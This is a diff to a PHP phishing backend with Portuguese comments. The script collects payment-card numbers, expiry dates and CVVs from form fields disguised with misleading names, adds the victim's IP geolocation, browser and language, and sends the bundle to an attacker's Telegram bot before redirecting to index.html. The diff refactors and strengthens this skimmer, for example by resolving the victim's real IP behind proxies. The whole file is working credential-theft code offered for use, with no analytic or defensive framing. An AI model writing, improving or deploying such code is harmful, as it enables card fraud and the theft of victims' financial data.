@@ -1,81 +1,28 @@
 <?php
-ob_start(); // Inicia buffer para evitar erros de header já enviados 4
+// Inicia buffer para evitar erros de “headers already sent”
+ob_start();
 
-// Função para obter informações de IP com tratamento de erros
-function getIpInfo($ip) {
+/**
+ * Obtém informações de geolocalização a partir do IP via ip-api.com,
+ * retornando valores padrão em caso de erro.
+ */
+function getIpInfo(string $ip): array {
     $apiUrl  = "http://ip-api.com/json/{$ip}";
-    $apiData = @file_get_contents($apiUrl); // Suprime warnings 5
+    $apiData = @file_get_contents($apiUrl); // Suprime warnings
     if ($apiData === false) {
         return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
     }
-    $data = json_decode($apiData, true); // Decodifica JSON 6
-    if (!isset($data['status']) || $data['status'] !== 'success') { // Valida status 7
+    $data = json_decode($apiData, true);
+    if (!isset($data['status']) || $data['status'] !== 'success') {
         return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
     }
     return $data;
 }
 
-// Função para enviar mensagem ao Telegram via cURL
-function sendToTelegram($botToken, $chatId, $message) {
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $postFields = [
-        'chat_id' => $chatId,
-        'text'    => $message
-    ];
-    $ch = curl_init($url); // Inicia sessão cURL 8
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); // Usa POST conforme recomendado 9
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    if ($response === false) {
-        error_log("cURL Error: " . curl_error($ch));
-    }
-    curl_close($ch);
-    return $response;
-}
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Recupera e sanitiza campos
-    $numero    = trim($_POST['campoNome']   ?? '');
-    $validade  = trim($_POST['campoTel']    ?? '');
-    $cvv       = trim($_POST['campoTel2']   ?? '');
-    if ($numero && $validade && $cvv) {
-        $ip        = $_SERVER['REMOTE_ADDR'];
-        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-        $lang      = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
-        
-        $info      = getIpInfo($ip);
-        $browser   = getBrowserName($userAgent);
-        // Monta texto da mensagem
-        $txt  = "💳 Número: {$numero}\n";
-        $txt .= "📅 Validade: {$validade}\n";
-        $txt .= "🔑 CVV: {$cvv}\n";
-        $txt .= "🌐 IP: {$info['query']}\n";
-        $txt .= "🏙 Cidade: {$info['city']}\n";
-        $txt .= "📍 Região: {$info['regionName']}\n";
-        $txt .= "🌏 País: {$info['country']}\n";
-        $txt .= "📡 ISP: {$info['isp']}\n\n";
-        $txt .= "🖥 User-Agent: {$userAgent}\n";
-        $txt .= "🌎 Navegador: {$browser}\n";
-        $txt .= "🗣 Linguagem: {$lang}\n";
-        $txt .= "⏰ Data/Hora: " . date('Y-m-d H:i:s');
-
-        // Lê variáveis de ambiente no Render 10
-        $token  = getenv('BOT_TOKEN') ?: '';
-        $chatId = getenv('CHAT_ID')   ?: '';
-        sendToTelegram($token, $chatId, $txt);
-
-        header('Location: index.html'); // Redireciona após envio 11
-        exit;
-    }
-    echo 'Por favor, preencha todos os campos.';
-} else {
-    header('Location: index.html');
-    exit;
-}
-
-// Função de detecção de navegador (mantida)
-function getBrowserName($ua) {
+/**
+ * Detecta o navegador a partir do user agent.
+ */
+function getBrowserName(string $ua): string {
     if (stripos($ua, 'Firefox') !== false)   return 'Firefox';
     if (stripos($ua, 'MSIE')    !== false ||
         stripos($ua, 'Trident') !== false)   return 'Internet Explorer';
@@ -86,4 +33,89 @@ function getBrowserName($ua) {
         stripos($ua, 'OPR')     !== false)   return 'Opera';
     return 'Desconhecido';
 }
+
+/**
+ * Envia mensagem ao Telegram usando cURL.
+ */
+function sendToTelegram(string $botToken, string $chatId, string $message): bool {
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postFields = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    if ($response === false) {
+        error_log("cURL Error: " . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    curl_close($ch);
+    // opcional: validar json {"ok":true,...}
+    return true;
+}
+
+// Verifica método
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Lê e sanitiza campos do formulário
+    $numero   = trim($_POST['campoNome']  ?? '');
+    $validade = trim($_POST['campoTel']   ?? '');
+    $cvv      = trim($_POST['campoTel2']  ?? '');
+
+    if ($numero === '' || $validade === '' || $cvv === '') {
+        echo 'Por favor, preencha todos os campos.';
+        ob_end_flush();
+        exit;
+    }
+
+    // Obtém o IP real, mesmo atrás de proxy
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ip  = trim($ips[0]);
+    } else {
+        $ip  = $_SERVER['REMOTE_ADDR'];
+    }
+
+    $userAgent = $_SERVER['HTTP_USER_AGENT']          ?? 'N/A';
+    $lang      = $_SERVER['HTTP_ACCEPT_LANGUAGE']     ?? 'N/A';
+    $info      = getIpInfo($ip);
+    $browser   = getBrowserName($userAgent);
+    $dateTime  = date('Y-m-d H:i:s');
+
+    // Monta o texto da mensagem
+    $message  = "☠️ | LOG\n";
+    $message .= "💳 Número do Cartão: {$numero}\n";
+    $message .= "📅 Validade: {$validade}\n";
+    $message .= "🔑 CVV: {$cvv}\n\n";
+    $message .= "🏠 IP: {$info['query']}\n";
+    $message .= "🔎 Cidade: {$info['city']}\n";
+    $message .= "📍 Região: {$info['regionName']}\n";
+    $message .= "🌎 País: {$info['country']}\n";
+    $message .= "📦 ISP: {$info['isp']}\n\n";
+    $message .= "🔓 USER-AGENT: {$userAgent}\n";
+    $message .= "🌐 Navegador: {$browser}\n";
+    $message .= "👥 Linguagem: {$lang}\n";
+    $message .= "📆 Data/Hora: {$dateTime}";
+
+    // Lê credenciais do ambiente (definidas no Render)
+    $botToken = getenv('BOT_TOKEN') ?: '';
+    $chatId   = getenv('CHAT_ID')   ?: '';
+
+    // Envia ao Telegram
+    if (sendToTelegram($botToken, $chatId, $message)) {
+        header('Location: index.html');
+        exit;
+    } else {
+        echo 'Houve um erro ao enviar os dados. Tente novamente.';
+    }
+
+} else {
+    // Se não for POST, redireciona
+    header('Location: index.html');
+    exit;
+}
+
 ob_end_flush();
